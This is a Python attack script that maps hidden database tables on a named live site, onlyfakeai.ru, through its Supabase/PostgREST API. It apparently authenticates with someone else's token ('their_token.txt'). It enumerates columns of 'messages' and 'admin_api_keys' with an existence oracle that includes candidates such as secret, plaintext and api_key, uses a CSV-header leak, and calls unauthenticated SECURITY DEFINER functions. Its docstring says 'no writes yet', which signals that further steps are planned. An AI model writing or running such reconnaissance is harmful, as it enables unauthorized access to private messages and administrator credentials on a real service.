#!/usr/bin/env python3
"""Read-only schema discovery for hidden tables (no writes yet).
Trick 1: PostgREST CSV output includes a header row with column names even for empty results.
Trick 2: expanded column-existence oracle.
Also reads the unauthenticated SECURITY DEFINER RPCs for message-related fields."""
import ssl, json, time, http.cookiejar, urllib.request, urllib.error

CTX = ssl.create_default_context()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
BASE = "https://onlyfakeai.ru/api/supabase"
KEY = "<publishable-key>"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPSHandler(context=CTX),
                                 urllib.request.HTTPCookieProcessor(cj))
TOK = json.load(open("their_token.txt"))["access_token"]


def r(method, url, h=None, b=None):
    hh = {"User-Agent": UA}
    hh.update(h or {})
    rq = urllib.request.Request(url, data=b, headers=hh, method=method)
    try:
        with op.open(rq, timeout=20) as x:
            return x.status, dict(x.headers), x.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return 0, {}, str(e).encode()


AUTH = {"apikey": KEY, "Authorization": "Bearer " + TOK}

print("== CSV header trick (read-only) ==")
for t in ["messages", "admin_api_keys"]:
    for hdr in [("text/csv", {"Accept": "text/csv"}),
                ("pgrst plan", {"Accept": 'application/vnd.pgrst.plan+text; for="application/json"; options=analyze'})]:
        st, hd, b = r("GET", f"{BASE}/rest/v1/{t}?select=*&limit=0", {**AUTH, **hdr[1]})
        print(f"  {t} [{hdr[0]}] -> {st} ct={hd.get('content-type','')[:40]} len={len(b)}: {b[:300].decode('utf-8','ignore').replace(chr(10),' | ')}")
        time.sleep(0.3)

print("\n== expanded column oracle: messages ==")
COLS = """message message_text msg msg_text text text_content content content_text body body_text
html html_body subject title payload data json metadata meta type kind category channel direction
sender sender_id recipient recipient_id from_user to_user to from admin_id admin_user_id job_id
telegram_id telegram_message_id telegram_chat_id chat_id tg_chat_id tg_message_id message_id
is_read read read_at sent_at updated_at deleted_at expires_at locale language ip user_agent
email name username phone photo_url document_type template variables status state error
attachment attachments file file_url image_url reply_to parent_id thread_id""".split()
found = []
for c in COLS:
    st, hd, b = r("GET", f"{BASE}/rest/v1/messages?select={c}&limit=0", AUTH)
    if st == 200:
        found.append(c)
        print(f"  EXISTS: {c}")
    time.sleep(0.1)
print("  messages payload columns found:", found)

print("\n== extra admin_api_keys candidates ==")
for c in """key api_key secret token hash value plaintext prefix key_prefix key_hash scopes
label description notes name active enabled last_used_at expires_at created_by""".split():
    st, hd, b = r("GET", f"{BASE}/rest/v1/admin_api_keys?select={c}&limit=0", AUTH)
    if st == 200:
        print(f"  EXISTS: {c}")
    time.sleep(0.1)

print("\n== unauth SECURITY DEFINER RPCs (read-only) ==")
for rpc in ["get_recent_activity", "get_total_counts", "get_job_status_counts"]:
    st, hd, b = r("POST", f"{BASE}/rest/v1/rpc/{rpc}", {**AUTH, "Content-Type": "application/json"}, b"{}")
    print(f"  {rpc} -> {st}: {b[:400].decode('utf-8','ignore').replace(chr(10),' ')}")
    time.sleep(0.5)
